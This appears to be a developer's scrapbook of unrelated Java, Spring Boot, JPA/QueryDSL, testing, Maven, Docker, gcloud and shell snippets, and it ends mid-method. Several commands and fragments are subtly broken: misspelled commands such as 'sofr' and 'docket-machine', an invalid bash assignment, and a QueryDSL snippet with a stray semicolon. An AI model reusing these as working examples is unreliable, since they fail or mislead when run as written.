--------------------------------------------------------------------------------------------------------
@Configuration
@EnableTransactionManagement
@EnableJpaRepositories(
 entityManagerFactoryRef = "customerEntityManagerFactory",
 transactionManagerRef = "customerTransactionManager",
 basePackages = {
  "com.javadevjournal.customer.repo"
 }
)
public class CustomerConfig {

 @Primary
 @Bean(name = "customerDataSource")
 @ConfigurationProperties(prefix = "spring.datasource")
 public DataSource customerDataSource() {
  return DataSourceBuilder.create().build();
 }

 @Primary
 @Bean(name = "customerEntityManagerFactory")
 public LocalContainerEntityManagerFactoryBean
 entityManagerFactory(
  EntityManagerFactoryBuilder builder,
  @Qualifier("customerDataSource") DataSource dataSource
 ) {
  return builder
   .dataSource(dataSource)
   .packages("com.javadevjournal.customer.data")
   .persistenceUnit("db1")
   .build();
 }

 @Primary
 @Bean(name = "customerTransactionManager")
 public PlatformTransactionManager customerTransactionManager(
  @Qualifier("customerEntityManagerFactory") EntityManagerFactory customerEntityManagerFactory
 ) {
  return new JpaTransactionManager(customerEntityManagerFactory);
 }
}

@Configuration
@EnableTransactionManagement
@EnableJpaRepositories(
 entityManagerFactoryRef = "productEntityManagerFactory",
 transactionManagerRef = "productTransactionManager",
 basePackages = {
  "com.javadevjournal.product.repo"
 }
)
public class ProductConfig {

 @Bean(name = "productDataSource")
 @ConfigurationProperties(prefix = "db2.datasource")
 public DataSource dataSource() {
  return DataSourceBuilder.create().build();
 }

 @Bean(name = "productEntityManagerFactory")
 public LocalContainerEntityManagerFactoryBean
 barEntityManagerFactory(
  EntityManagerFactoryBuilder builder,
  @Qualifier("productDataSource") DataSource dataSource
 ) {
  return
  builder
   .dataSource(dataSource)
   .packages("com.javadevjournal.product.data")
   .persistenceUnit("db2")
   .build();
 }

 @Bean(name = "productTransactionManager")
 public PlatformTransactionManager productTransactionManager(
  @Qualifier("productEntityManagerFactory") EntityManagerFactory productEntityManagerFactory
 ) {
  return new JpaTransactionManager(productEntityManagerFactory);
 }
}

@RunWith(SpringRunner.class)
@SpringBootTest
public class MultipleDataSourcesProductTests {

    @Autowired
    private ProductRepository productRepository;
    
    @Test
    @Transactional("productTransactionManager")
    public void create_check_product() {
        ProductModel product = new ProductModel("228781","Running Shoes", 20.0);
        product = productRepository.save(product);

        assertNotNull(productRepository.findById(product.getId()));
    }

}
//Customer test
@RunWith(SpringRunner.class)
@SpringBootTest
public class MultipleDataSourcesCustomerTests {


    @Autowired
    private CustomerRepository customerRepository;

    @Test
    @Transactional("customerTransactionManager")
    public void create_check_customer() {

        CustomerModel customer = new CustomerModel("user@www.javadevjournal.com","Robert","Hickle");
        customer = customerRepository.save(customer);

        assertNotNull(customerRepository.findById(customer.getId()));
        assertEquals(customerRepository.findById(customer.getId()).get().getEmail() ,"user@www.javadevjournal.com");
    }
}
--------------------------------------------------------------------------------------------------------
  @Bean
  public Module javaTimeModule() {
    return new JavaTimeModule();
  }

  @Bean
  public Module jdk8Module() {
    return new Jdk8Module();
  }
  
import static org.mockito.BDDMockito.given;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import java.util.ArrayList;
import java.util.List;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import com.fasterxml.jackson.databind.ObjectMapper;
import eu.wiegandt.toepferportal.controllers.TerminController;
import eu.wiegandt.toepferportal.entities.Termin;

@RunWith(SpringRunner.class)
@WebMvcTest(TerminController.class)
@AutoConfigureMockMvc(secure = false)
public class TerminControllerTest {
  @Autowired
  private MockMvc mvc;


  @Test
  public void testGetAll() throws Exception {
    final List<Termin> testTermine = new ArrayList<>();

    final ObjectMapper objectMapper = new ObjectMapper();
    mvc.perform(get("/termine").accept(MediaType.APPLICATION_JSON_UTF8)).andExpect(status().isOk())
        .andExpect(content().json(objectMapper.writeValueAsString(testTermine)));
  }
}  
--------------------------------------------------------------------------------------------------------
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
            <plugin>
                <groupId>com.spotify</groupId>
                <artifactId>docker-maven-plugin</artifactId>
                <version>0.23.0</version>
                <configuration>
                    <imageName>${project.groupId}/${project.artifactId}</imageName>
                    <tag>${project.version}</tag>
                    <dockerDirectory>src/main/docker</dockerDirectory>
                    <resources>
                        <resource>
                            <targetPath>/</targetPath>
                            <directory>${project.build.directory}</directory>
                            <include>${project.build.finalName}.jar</include>
                        </resource>
                    </resources>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-failsafe-plugin</artifactId>
                <executions>
                    <execution>
                        <goals>
                            <goal>integration-test</goal>
                            <goal>verify</goal>
                        </goals>
                    </execution>
                </executions>
                <configuration>
                    <environmentVariables>
                        <TOEPFERPLANER_DB_HOST>localhost</TOEPFERPLANER_DB_HOST>
                        <TOEPFERPLANER_DB_PORT>${it-database.port}</TOEPFERPLANER_DB_PORT>
                        <TOEPFERPLANER_DB_DATABASE>${test.db.name}</TOEPFERPLANER_DB_DATABASE>
                        <TOEPFERPLANER_DB_USER>${test.db.user.name}</TOEPFERPLANER_DB_USER>
                        <TOEPFERPLANER_DB_PASSWORD>${test.db.user.pw}</TOEPFERPLANER_DB_PASSWORD>
                    </environmentVariables>
                </configuration>
            </plugin>
            <plugin>
                <groupId>io.fabric8</groupId>
                <artifactId>docker-maven-plugin</artifactId>
                <version>0.20.1</version>
                <executions>
                    <execution>
                        <id>prepare-it-database</id>
                        <phase>pre-integration-test</phase>
                        <goals>
                            <goal>start</goal>
                        </goals>
                        <configuration>
                            <images>
                                <image>
                                    <name>mariadb:latest</name>
                                    <alias>it-database</alias>
                                    <run>
                                        <ports>
                                            <port>it-database.port:3306</port>
                                        </ports>
                                        <env>
                                            <MYSQL_ROOT_PASSWORD>${test.db.root.pw}</MYSQL_ROOT_PASSWORD>
                                            <MYSQL_DATABASE>${test.db.name}</MYSQL_DATABASE>
                                            <MYSQL_USER>${test.db.user.name}</MYSQL_USER>
                                            <MYSQL_PASSWORD>${test.db.user.pw}</MYSQL_PASSWORD>
                                        </env>
                                        <wait>
                                            <log>mysqld: ready for connections</log>
                                            <time>20000</time>
                                        </wait>
                                    </run>
                                </image>
                            </images>
                        </configuration>
                    </execution>
                    <execution>
                        <id>remove-it-database</id>
                        <phase>post-integration-test</phase>
                        <goals>
                            <goal>stop</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
        <resources>
            <resource>
                <directory>src/main/docker</directory>
                <filtering>true</filtering>
            </resource>
        </resources>
    </build>
-------------------------------------------------------------------------------------------------------
vue init nuxt-community/starter-template cproject-names
find / -print > filelist 2> no_access
diff -u <(sort file1) <(sofr file2) | less

--------------------------------------------------------------------------------------------------------
docket-machine ip
yum list available
dig +noall +answer www any

ip addr show up
ip link set etho0 up

while [ $lines -le $maxlines ]  
do
	echo >> $BUFFER
	lines = $((lines + 1))
done

if [ -d $file -o \(-f $file -a -r $file\) ]
--------------------------------------------------------------------------------------------------------
List<String> lines = Files.readAllLines(Paths.get(res.getURI()),
        StandardCharsets.UTF_8);
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.MessageSource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.support.ReloadableResourceBundleMessageSource;
import org.springframework.validation.beanvalidation.LocalValidatorFactoryBean;

@SpringBootApplication
public class Application {

    @Bean
    public MessageSource messageSource() {
        ReloadableResourceBundleMessageSource messageSource = new ReloadableResourceBundleMessageSource();
        messageSource.setBasename("classpath:messages");
        messageSource.setDefaultEncoding("UTF-8");
        return messageSource;
    }

    @Bean
    public LocalValidatorFactoryBean validator() {
        LocalValidatorFactoryBean bean = new LocalValidatorFactoryBean();
        bean.setValidationMessageSource(messageSource());
        return bean;
    }

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }
}

import org.springframework.context.MessageSource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.support.ReloadableResourceBundleMessageSource;
import org.springframework.validation.Validator;
import org.springframework.validation.beanvalidation.LocalValidatorFactoryBean;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

@Configuration
@EnableWebMvc
public class WebConfiguration extends WebMvcConfigurerAdapter {

    @Bean
    public MessageSource messageSource() {
        ReloadableResourceBundleMessageSource messageSource = new ReloadableResourceBundleMessageSource();
        messageSource.setBasename("classpath:messages");
        messageSource.setDefaultEncoding("UTF-8");
        return messageSource;
    }

    @Bean
    @Override
    public Validator getValidator() {
        LocalValidatorFactoryBean bean = new LocalValidatorFactoryBean();
        bean.setValidationMessageSource(messageSource());
        return bean;
    }

    // other methods...
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class) 
@WebMvcTest
@AutoConfigureMockMvc
public class UserControllerIntegrationTest {
 
    @MockBean
    private UserRepository userRepository;
     
    @Autowired
    UserController userController;
 
    @Autowired
    private MockMvc mockMvc;
 
    //...
     
}

@Test
public void whenPostRequestToUsersAndValidUser_thenCorrectResponse() throws Exception {
    MediaType textPlainUtf8 = new MediaType(MediaType.TEXT_PLAIN, Charset.forName("UTF-8"));
    String user = "{\"name\": \"bob\", \"email\" : \"bob@domain.com\"}";
    mockMvc.perform(MockMvcRequestBuilders.post("/users")
      .content(user)
      .contentType(MediaType.APPLICATION_JSON_UTF8))
      .andExpect(MockMvcResultMatchers.status().isOk())
      .andExpect(MockMvcResultMatchers.content()
        .contentType(textPlainUtf8));
}
 
@Test
public void whenPostRequestToUsersAndInValidUser_thenCorrectResponse() throws Exception {
    String user = "{\"name\": \"\", \"email\" : \"bob@domain.com\"}";
    mockMvc.perform(MockMvcRequestBuilders.post("/users")
      .content(user)
      .contentType(MediaType.APPLICATION_JSON_UTF8))
      .andExpect(MockMvcResultMatchers.status().isBadRequest())
      .andExpect(MockMvcResultMatchers.jsonPath("$.name", Is.is("Name is mandatory")))
      .andExpect(MockMvcResultMatchers.content()
        .contentType(MediaType.APPLICATION_JSON_UTF8));
    }
}
--------------------------------------------------------------------------------------------------------
   @Test
    public void sum() throws Exception {
        final NumberPath<BigDecimal> num = new NumberPath<BigDecimal>(BigDecimal.class, "num");
        final CollQuery query = CollQueryFactory.from(num, Arrays.asList(new BigDecimal("1.6"), new BigDecimal("1.3")));

        // fail because sum use longValue
        assertEquals(new BigDecimal("2.9"), query.uniqueResult(num.sum()));
    }
	public final class CollQueryFunctions {
...
    private static final BinaryFunction SUM = new BinaryFunction() {
        @Override
        public Number apply(Number num1, Number num2) {
            if (num1 instanceof Double || num1 instanceof Float) {
                return num1.doubleValue() + num2.doubleValue();
            } else {
                return num1.longValue() + num2.longValue();
            }
        }
    };
...
}
https://vike.io/ru/169783/
https://stackoverflow.com/questions/18300465/spring-data-jpa-and-querydsl-to-fetch-subset-of-columns-using-bean-constructor-p
https://www.baeldung.com/intro-to-querydsl
--------------------------------------------------------------------------------------------------------
@Entity
@Table(name = "doc_documents")
public class Document {
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private Long id;

    @ElementCollection(fetch = FetchType.LAZY)
    @CollectionTable(name = "doc_document_mesh_thes_terms",
        joinColumns =
            @JoinColumn(name = "document_id"))
    @Column(name = "thesaurus_term", nullable = false, length = FieldLength.STRING_MED)
    @OrderColumn(name = "idx")
    private List<String> meshThesaurusTerms = new ArrayList<>();
    ….
}   
--------------------------------------------------------------------------------------------------------
        final JPAQueryFactory queryFactory = new JPAQueryFactory(this.getEntityManager());
        final QFileEntity user = QFileEntity.fileEntity;
        final FileEntity c = queryFactory.selectFrom(user)
                .where(user.version().locales.contains(new LocaleInfoEntity(searchParameters.getLocale())))
                .fetchOne();
--------------------------------------------------------------------------------------------------------
@Entity
@Table(name="projet")
public class Project {

    @Id 
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "id", columnDefinition="serial")
    private int id;

    @Column(name="code")
    private String code;

    @Column(name="designation")
    private String designation;

    @OneToMany(cascade = CascadeType.ALL, mappedBy="project", orphanRemoval=true)
    @OrderBy(clause="id DESC")
    private List<ProjectHasChief> chiefs = new ArrayList<ProjectHasChief>();
}
--------------------------------------------------------------------------------------------------------
public class LocalDateStringType 
  extends AbstractSingleColumnStandardBasicType<LocalDate> {
 
    public static final LocalDateStringType INSTANCE = new LocalDateStringType();
 
    public LocalDateStringType() {
        super(VarcharTypeDescriptor.INSTANCE, LocalDateStringJavaDescriptor.INSTANCE);
    }
 
    @Override
    public String getName() {
        return "LocalDateString";
    }
}

public class LocalDateStringJavaDescriptor extends AbstractTypeDescriptor<LocalDate> {
 
    public static final LocalDateStringJavaDescriptor INSTANCE = 
      new LocalDateStringJavaDescriptor();
 
    public LocalDateStringJavaDescriptor() {
        super(LocalDate.class, ImmutableMutabilityPlan.INSTANCE);
    }
     
    // other methods
}

https://www.baeldung.com/hibernate-custom-types
https://habr.com/ru/post/91328/
https://habr.com/ru/post/91434/
--------------------------------------------------------------------------------------------------------
public @interface ContextConfiguration {

    @AliasFor("locations")
    String[] value() default {};

    @AliasFor("value")
    String[] locations() default {};

    // ...
}
--------------------------------------------------------------------------------------------------------
import org.junit.Test;

import org.junit.runner.RunWith;

import org.springframework.boot.test.context.SpringBootTest;

import org.springframework.test.context.junit4.SpringRunner;

@RunWith(SpringRunner.class)

@SpringBootTest

public class SpringBoot2RestServiceApplicationTests {

  @Test

  public void contextLoads() {

  }

}
--------------------------------------------------------------------------------------------------------
import lombok.Builder;
import lombok.Data;

@Data
@Builder
public class ResponseDTO<T> {
    private String status;

    @Builder.Default
    private String message = "Success!";

    private T body;
}
--------------------------------------------------------------------------------------------------------
spring.devtools.restart.poll-interval=10
spring.devtools.restart.quiet-period=5
spring.devtools.restart.exclude=public/myPage2.html
--------------------------------------------------------------------------------------------------------
spring.jpa.hibernate.naming.physical-strategy=org.hibernate.boot.model.naming.PhysicalNamingStrategyStandardImpl
--------------------------------------------------------------------------------------------------------
@Component
public class ExampleClient {

  @Autowired
  private EmployeeRepository repo;

  public void run() {
      List<Employee> employees = createEmployees();
      repo.saveAll(employees);
      System.out.println("-- employees persisted --");
      employees.forEach(System.out::println);

      System.out.println(" -- employees having salary greater than 3000 order by salary --");
      //BooleanExpression implements Predicate
      //goe='greater than or equals'
      BooleanExpression booleanExpression = QEmployee.employee.salary.goe(3000);
      OrderSpecifier<Integer> orderSpecifier = QEmployee.employee.salary.asc();
      Iterable<Employee> employees2 = repo.findAll(booleanExpression, orderSpecifier);
      employees2.forEach(System.out::println);

      System.out.println(" -- employees in IT and Admin depts and salary between 3000 and 5000 --");
      BooleanExpression booleanExpression2 = QEmployee.employee.dept.in("IT", "Admin").and(
              QEmployee.employee.salary.between(3000, 5000));
              Iterable<Employee> employee3 = repo.findAll(booleanExpression2);
      employee3.forEach(System.out::println);

      System.out.println(" -- find employee Mike --");
      BooleanExpression booleanExpression3 = QEmployee.employee.name.eq("Mike");
      Optional<Employee> opt = repo.findOne(booleanExpression3);
      System.out.println(opt.get());
  }

  private List<Employee> createEmployees() {
      return Arrays.asList(
              Employee.create("Diana", "Admin", 2000),
              Employee.create("Mike", "Sales", 1000),
              Employee.create("Rose", "IT", 4000),
              Employee.create("Sara", "Admin", 3500),
              Employee.create("Randy", "Sales", 3000),
              Employee.create("Charlie", "IT", 2500)
      );
  }
}
--------------------------------------------------------------------------------------------------------

@Mock
DataService dataService;

MockitoSession session;

@BeforeMethod
public void beforeMethod() {
    session = Mockito.mockitoSession()
            .initMocks(this)
            .startMocking();
}

@Test
public void testMethod() {
    // some code using the dataService field
}

@AfterMethod
public void afterMethod() {
    session.finishMocking();
}
--------------------------------------------------------------------------------------------------------
@Test public void
lotto_resource_returns_200_with_expected_id_and_winners() {

    when().
            get("/lotto/{id}", 5).
    then().
            statusCode(200).
            body("lotto.lottoId", equalTo(5),
                 "lotto.winners.winnerId", hasItems(23, 54));

}
--------------------------------------------------------------------------------------------------------
gcloud config set project project-id
gcloud auth login
gcloud components update sql
To list the current Cloud SQL instances for the project:
gcloud sql instances list
To get detailed information about the instance in YAML format:
gcloud sql instances describe instance-name
To get a list of automatic backups for the instance, each identified by a timestamp:
gcloud sql backups list --instance instance-name
To restore a backup from this list:
gcloud sql instances restore-backup --instance instance-name --due-time timestamp
You can initiate exports and imports from the command line as well. As with doing
this from the Cloud Console, exports and imports use Cloud Storage for storing or
reading data. To initiate an export of all databases on the instance to a given Cloud
Storage path:
gcloud sql instances export instance-name gs://bucket-name/object-name
You can narrow the export to specific databases or tables using the --database and
--table flags.
The command to import a file from Cloud Storage is similar:
gcloud sql instances import instance-name gs://bucket-name/object-name
Naturally, you can upload and download files to and from Cloud Storage from the
command line as well. For this, you use the gsutil command. Make sure you have
this command installed:
gcloud components update gsutil
To download a file from Cloud Storage:
gsutil cp gs://bucket-name/object-name .
Just like the cp command, gsutil cp takes a path to the file to copy, and a destination
path. If the destination path is a directory path (like . for the current directory), the
file is copied using its original filename.
To upload a file to Cloud Storage, use the gsutil cp command with a gs:// path as
the second argument:
gsutil cp filename.gz gs://bucket-name/object-name

jdbc:google:mysql://project-id:instance-name/database?user=username
--------------------------------------------------------------------------------------------------------
Book book = new Book();
 book.setBookCoverImage(new BookCoverImage());
 book.setTitle("The Grapes of Wrath");
 book.bookCoverImage.setType("image/jpg");
 EntityTransaction txn = em.getTransaction();
 txn.begin();
 try {
 em.persist(book);
 txn.commit();
 } finally {
 if (txn.isActive()) {
 txn.rollback();
 }
 }
 em.close();


import javax.persistence.Basic;
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import org.datanucleus.api.jpa.annotations.Extension;
@Entity
public class BookReview {
 @Id
 @GeneratedValue(strategy = GenerationType.IDENTITY)
 @Extension(vendorName = "datanucleus",
 key = "gae.encoded-pk",
 value = "true")
 private String keyString;
 @Basic
 @Extension(vendorName = "datanucleus",
 key = "gae.parent-pk",
 value = "true")
 private String bookKeyString;
}


package myapp; // where "myapp" is your app's package
import javax.persistence.EntityManagerFactory;
import javax.persistence.Persistence;
public final class EMF {
 private static final EntityManagerFactory emfInstance =
 Persistence.createEntityManagerFactory("transactions-optional");
 private EMF() {}
 public static EntityManagerFactory get() {
 return emfInstance;
 }
}
--------------------------------------------------------------------------------------------------------
$ play new play-server
--------------------------------------------------------------------------------------------------------

import cucumber.api.junit.Cucumber;
import org.junit.runner.RunWith;

@RunWith(Cucumber.class)
@Cucumber.Options(
        format = {"pretty"},
        features = "./src/it/resources"
)

// The class name must end in "Test" to be found by Maven by default
public class CucumberTest {
}
--------------------------------------------------------------------------------------------------------
 packer build template.json
--------------------------------------------------------------------------------------------------------
package firsttestngpackage;
import org.openqa.selenium.*;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.testng.Assert;
import org.testng.annotations.*;

public class firsttestngfile {
    public String baseUrl = "http://demo.guru99.com/test/newtours/";
    String driverPath = "C:\\geckodriver.exe";
    public WebDriver driver ; 
     
  @Test
  public void verifyHomepageTitle() {
       
      System.out.println("launching firefox browser"); 
      System.setProperty("webdriver.firefox.marionette", driverPath);
      driver = new FirefoxDriver();
      driver.get(baseUrl);
      String expectedTitle = "Welcome: Mercury Tours";
      String actualTitle = driver.getTitle();
      Assert.assertEquals(actualTitle, expectedTitle);
      driver.close();
  }
}

package firsttestngpackage;
import org.openqa.selenium.*;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.testng.Assert;
import org.testng.annotations.*;
public class firsttestngfile {
    public String baseUrl = "http://demo.guru99.com/test/newtours/";
    String driverPath = "C:\\geckodriver.exe";
    public WebDriver driver ; 
     
     @BeforeTest
      public void launchBrowser() {
          System.out.println("launching firefox browser"); 
          System.setProperty("webdriver.firefox.marionette", driverPath);
          driver = new FirefoxDriver();
          driver.get(baseUrl);
      }
      @Test
      public void verifyHomepageTitle() {
          String expectedTitle = "Welcome: Mercury Tours";
          String actualTitle = driver.getTitle();
          Assert.assertEquals(actualTitle, expectedTitle);
     }
      @AfterTest
      public void terminateBrowser(){
          driver.close();
      }
}
--------------------------------------------------------------------------------------------------------
 private RestTemplate restTemplate() {
 ObjectMapper mapper = new ObjectMapper();
 mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES,
 false);
 mapper.registerModule(new Jackson2HalModule());
 MappingJackson2HttpMessageConverter converter =
 new MappingJackson2HttpMessageConverter();
 converter.setSupportedMediaTypes(
 MediaType.parseMediaTypes("application/hal+json"));
 converter.setObjectMapper(mapper);
 return new RestTemplate(Arrays.asList(converter));
 }
--------------------------------------------------------------------------------------------------------
<dependencies>
 <dependency>
 <groupId>org.springframework.data</groupId>
 <artifactId>spring-data-rest-hal-browser</artifactId>
 </dependency>
</dependencies>

mvn clean package -Dmaven.test.skip=true
--------------------------------------------------------------------------------------------------------
<plugin>
 <groupId>com.github.os72</groupId>
 <artifactId>protoc-jar-maven-plugin</artifactId>
 <version>3.1.0</version>
 <executions>
 <execution>
 <phase>generate-sources</phase>
<goals>
 <goal>run</goal>
 </goals>
<configuration>
 <protocVersion>3.1.0</protocVersion>
<includeStdTypes>true</includeStdTypes>
<includeDirectories>
 <include>
 src/main/resources
 </include>
 </includeDirectories>
<inputDirectories>
 <include>
 src/main/protobuf
 </include>
 </inputDirectories>
 </configuration>
 </execution>
 </executions>
 </plugin>
--------------------------------------------------------------------------------------------------------
package com.codepoetics.octarine.records;

public interface RecordKey extends Key<Record> {
    static <T> RecordKey named(String name, Value...metadata) {
        return named(name, Record.of(metadata));
    }

    static <T> RecordKey named(String name, Record metadata) {
        return new Impl<T>(name, metadata);
    }

    static final class Impl<T> extends BaseKey<Record> implements RecordKey {
        Impl(String name, Record metadata) {
            super(name, metadata);
        }
    }

    default Value of(Value... values) {
        return of(Record.of(values));
    }

}
--------------------------------------------------------------------------------------------------------
D:\Applns\Google\ProtocolBuffer\protoc-3.4.0-win32\bin\protoc --proto_path
.\src\main\resources --java_out .\src\main\java .\src\main\resources\
product.proto
--------------------------------------------------------------------------------------------------------
FROM ubuntu:precise
MAINTAINER Casimir Saternos

RUN echo "deb http://ppa.launchpad.net/webupd8team/java/ubuntu precise main" | tee -a /etc/apt/sources.list
RUN echo "deb-src http://ppa.launchpad.net/webupd8team/java/ubuntu precise main" | tee -a /etc/apt/sources.list
RUN apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys EEA14886
RUN apt-get update
run apt-get -y install python
RUN echo oracle-java7-installer shared/accepted-oracle-license-v1-1 select true | /usr/bin/debconf-set-selections
RUN apt-get -y install oracle-java7-installer
RUN update-alternatives --display java
RUN echo "JAVA_HOME=/usr/lib/jvm/java-7-oracle" >> /etc/environment
RUN wget http://repo2.maven.org/maven2/org/mortbay/jetty/jetty-runner/8.1.9.v20130131/jetty-runner-8.1.9.v20130131.jar
RUN wget https://web-actions.googlecode.com/files/helloworld.war
RUN java -jar jetty-runner-8.1.9.v20130131.jar helloworld.war
  
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;
import org.openqa.selenium.support.ui.ExpectedCondition;
import org.openqa.selenium.support.ui.WebDriverWait;

public class SeleniumTest1 {
    public static void main(String[] args) {

        // WebDriver driver = new FirefoxDriver();
//		  WebDriver driver = new SafariDriver();
        WebDriver driver = new HtmlUnitDriver();  //HtmlUnitDriver(true) blows up though


// Additional work is required for Chrome...		
//  http://code.google.com/p/selenium/wiki/ChromeDriver
//  import org.openqa.selenium.chrome.ChromeDriver;
//  WebDriver driver = new ChromeDriver(); 

        driver.get("http://www.google.com");  //or driver.navigate().to("http://www.google.com");
        WebElement element = driver.findElement(By.name("q"));
        element.sendKeys("Cheese!");
        element.submit();  //  WebDriver finds the form from the element

        // Check the title of the page
        System.out.println("Page title is: " + driver.getTitle());

        // Google's search is rendered dynamically with JavaScript.
        // Wait for the page to load, timeout after 10 seconds
        (new WebDriverWait(driver, 10)).until(new ExpectedCondition<Boolean>() {
            public Boolean apply(WebDriver d) {
                return d.getTitle().toLowerCase().startsWith("cheese!");
            }
        });

        System.out.println("Page title is: " + driver.getTitle());
        driver.quit();
    }
}
--------------------------------------------------------------------------------------------------------
language: node_js
node_js:
  - 0.8

before_script:
  - export DISPLAY=:99.0
  - sh -e /etc/init.d/xvfb start
  - npm install --quiet -g karma
  - ./scripts/web-server.js > /dev/null &
  - sleep 1 # give server time to start

script:
  - karma start config/karma.conf.js --no-auto-watch --single-run --reporters=dots --browsers=Firefox
  - karma start config/karma-e2e.conf.js --reporters=dots --browsers=Firefox
--------------------------------------------------------------------------------------------------------
-webkit-transition: width 1s;

keytool -exportcert -alias rest -file %USERPROFILE%\tomcat.cer -storepass
tomcat 
<Connector port="8443"
protocol="org.apache.coyote.http11.Http11NioProtocol"
maxThreads="150" SSLEnabled="true" scheme="https" secure="true"
clientAuth="false" sslProtocol="TLS" keystorePass="tomcat" /> 
--------------------------------------------------------------------------------------------------------
-Xlint:{all, cast, deprecation, divzero, empty, unchecked, fallthrough, path, serial,
finally, overrides, -cast, -deprecation, -divzero, -empty, -unchecked, -fallthrough,
-path, -serial, -finally, -overrides, none} Enable or disable specific warnings
--------------------------------------------------------------------------------------------------------
 public static void main(String[] args) throws Exception {
 Class<SimpleTest> myClass = SimpleTest.class;
 if (myClass.isAnnotationPresent(RemoteObject.class)) {
 System.out.println("It is a RemoteObject");
 }
 else {
 System.out.println("It doesn't appear to be a RemoteObject!");
 }
 }
--------------------------------------------------------------------------------------------------------
import java.io.*;
 import java.util.*;
 public class Maze {
 static int[][]G; //known to all methods
 static int m, n, sr, sc; //known to all methods
 public static void main(String[] args) throws IOException {
 Scanner in = new Scanner(new FileReader("maze.in"));
 PrintWriter out = new PrintWriter(new FileWriter("maze.out"));
 getData(in);
 if (findPath(sr, sc)) printMaze(out);
 else out.printf("\nNo solution\n");
 in.close(); out.close();
 } // end main
 public static void getData(Scanner in) {
 m = in.nextInt(); n = in.nextInt();
 G = new int[m+1][n+1];
 sr = in.nextInt(); sc = in.nextInt();
 for (int r = 1; r <= m; r++)
 for (int c = 1; c <= n; c++)
 G[r][c] = in.nextInt();
 } //end getData
 public static boolean findPath(int r, int c) {
 if (r < 1 || r > m || c < 1 || c > n) return false;
 if (G[r][c] == 1) return false; //into a wall
 if (G[r][c] == 2) return false; //already considered
 // else G[r][c] = 0;
 G[r][c] = 2; //mark the path
 if (r == 1 || r == m || c == 1 || c == n) return true;
 //path found - space located on the border of the maze
 if (findPath(r-1, c)) return true;
 if (findPath(r, c+1)) return true;
 if (findPath(r+1, c)) return true;
 if (findPath(r, c-1)) return true;
 G[r][c] = 0; //no path found; unmark
 return false;
 } //end findPath
 public static void printMaze(PrintWriter out) {
 int r, c;
 for (r = 1; r <= m; r++) {
 for (c = 1; c <= n; c++)
 if (r == sr && c == sc) out.printf("S");
 else if (G[r][c] == 0) out.printf(" ");
 else if (G[r][c] == 1) out.printf("#");
 else out.printf("x");
 out.printf("\n");
 }
 } //end printMaze
 } //end class Maze
--------------------------------------------------------------------------------------------------------
QBean<Parent> parentProjection = Projections.fields(Parent.class, QParent.parent.id);
QBean<Child> childProjection = Projections.fields(Child.class, QChild.child.id);
EnumPath<Hobby> hobbies = Expressions.enumPath(Hobby.class, "hobbies");
Map<Parent, Group> result = from(QParent.parent)
    .innerJoin(QParent.children, QChild.child)
    .innerJoin(QChild.child.hobbies, hobbies);
    .transform(GroupBy.groupBy(parentProjection).as(GroupBy.list(childProjection), GroupBy.list(hobbies);

result.forEach((parent, groups) -> {
    parent.setChildren(groups.getList(childProjection));
    // How to get the hobbies of the parent children?
});
--------------------------------------------------------------------------------------------------------
wget http://central.maven.org/maven2/io/swagger/swagger-codegen-cli/2.4.9/swagger-codegen-cli-2.4.9.jar -O swagger-codegen-cli.jar

java -jar swagger-codegen-cli.jar help
--------------------------------------------------------------------------------------------------------
swagger-codegen generate -i http://petstore.swagger.io/v2/swagger.json -l ruby -o /tmp/test/
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.controller.impl;

import com.paragon.mailingcontour.commons.configuration.BaseExceptionHandler;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.web.servlet.error.ErrorAttributes;
import org.springframework.boot.web.servlet.error.ErrorController;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.request.WebRequest;

import javax.servlet.http.HttpServletResponse;
import java.util.HashMap;
import java.util.Map;

@Controller
@RequiredArgsConstructor
public class BaseErrorController implements ErrorController {
    private final ErrorAttributes errorAttributes;

    @Value("${server.error.path:${error.path:/error}}")
    private String path;

    @RequestMapping("${server.error.path:${error.path:/error}}")
    @ResponseBody
    public ResponseEntity<BaseExceptionHandler.ExceptionResponse> handleError(final WebRequest request, final HttpServletResponse response) {
        final Map<String, Object> errorAttributes = this.getErrorAttributes(request);
